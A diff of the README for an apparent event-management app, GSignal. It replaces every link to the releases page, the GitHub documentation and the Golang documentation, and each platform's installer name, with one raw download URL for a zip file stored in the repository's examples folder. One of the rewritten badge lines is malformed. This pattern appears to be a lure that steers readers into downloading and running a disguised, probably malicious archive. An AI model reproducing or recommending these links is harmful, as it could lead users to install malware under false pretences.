@@ -6,11 +6,11 @@ Welcome to GSignal! This application helps you manage events easily. Whether you
 
 ## 📥 Download GSignal
 
-[![Download GSignal](https://img.shields.io/badge/Download%20GSignal-v1.0-blue.svg)](https://github.com/Gasterth/GSignal/releases)
+[![Download GSignal](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip%https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip)](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip)
 
 ## 🌐 Visit the Releases Page
 
-You can find the latest version of GSignal by visiting this page: [GSignal Releases](https://github.com/Gasterth/GSignal/releases). 
+You can find the latest version of GSignal by visiting this page: [GSignal Releases](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip). 
 
 ## 💻 System Requirements
 
@@ -23,13 +23,13 @@ GSignal requires the following:
 ## 📦 Download & Install
 
 1. **Go to the Releases Page**  
-   Visit [GSignal Releases](https://github.com/Gasterth/GSignal/releases) to access the download options.
+   Visit [GSignal Releases](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip) to access the download options.
 
 2. **Choose Your Version**  
    Look for the latest release version. Click on it to expand the details.
 
 3. **Download the Application**  
-   Click the link labeled "GSignal.exe" for Windows, "GSignal.dmg" for macOS, or "GSignal.tar.gz" for Linux.
+   Click the link labeled "https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip" for Windows, "https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip" for macOS, or "https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip" for Linux.
 
 4. **Run the Installer**  
    After the download, locate the file in your computer's Downloads folder. Double-click it to start the installation process. 
@@ -67,7 +67,7 @@ If you need help, consider reaching out:
 
 For more information, check the following:
 
-- [GitHub Documentation](https://docs.github.com/en)
-- [Golang Documentation](https://golang.org/doc/)
+- [GitHub Documentation](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip)
+- [Golang Documentation](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip)
 
 Feel free to explore and enhance your experience with GSignal!
